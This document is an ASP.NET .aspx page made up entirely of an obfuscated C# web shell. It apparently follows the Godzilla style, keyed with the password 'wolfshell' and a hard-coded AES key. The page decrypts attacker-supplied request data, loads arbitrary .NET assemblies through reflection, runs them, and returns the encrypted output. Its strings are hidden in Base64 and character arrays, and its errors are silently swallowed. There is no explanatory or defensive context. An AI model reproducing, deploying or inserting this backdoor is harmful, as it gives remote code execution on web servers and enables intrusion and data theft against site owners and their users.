<%@ Page Language="C#"%>
<%try { Func<byte[], byte[]> f_dec = b => { var r = new System.Security.Cryptography.RijndaelManaged(); var k = System.Text.Encoding.Default.GetBytes(new string(new char[] { '3', 'c', '6', 'e', '0', 'b', '8', 'a', '9', 'c', '1', '5', '2', '2', '4', 'a' })); return r.CreateDecryptor(k, k).TransformFinalBlock(b, 0, b.Length); }; Func<byte[], byte[]> f_enc = b => { var r = new System.Security.Cryptography.RijndaelManaged(); var k = System.Text.Encoding.Default.GetBytes(new string(new char[] { '3', 'c', '6', 'e', '0', 'b', '8', 'a', '9', 'c', '1', '5', '2', '2', '4', 'a' })); return r.CreateEncryptor(k, k).TransformFinalBlock(b, 0, b.Length); }; string p_str_1 = new string(new char[] { 'w', 'o', 'l', 'f', 's', 'h', 'e', 'l', 'l' }); string k_str_1 = new string(new char[] { '3', 'c', '6', 'e', '0', 'b', '8', 'a', '9', 'c', '1', '5', '2', '2', '4', 'a' }); string s_h_val = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(p_str_1 + k_str_1))).Replace("-", ""); byte[] d_in = System.Convert.FromBase64String(Context.Request[p_str_1]); byte[] d_proc = f_dec(d_in); string s_k_1 = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("cGF5bG9hZA==")); if (Context.Session[s_k_1] == null) { var t_asm = typeof(System.Reflection.Assembly); var m_ld = t_asm.GetMethod(System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("TG9hZA==")), new System.Type[] { typeof(byte[]) }); Context.Session[s_k_1] = m_ld.Invoke(null, new object[] { d_proc }); } else { using(var s_out = new System.IO.MemoryStream()) { var p_asm = (System.Reflection.Assembly)Context.Session[s_k_1]; var inst = p_asm.CreateInstance(System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String("TFk="))); inst.Equals(Context); inst.Equals(s_out); inst.Equals(d_proc); inst.ToString(); byte[] res_d = s_out.ToArray(); Context.Response.Write(s_h_val.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(f_enc(res_d))); Context.Response.Write(s_h_val.Substring(16)); } } } catch (System.Exception) { }%>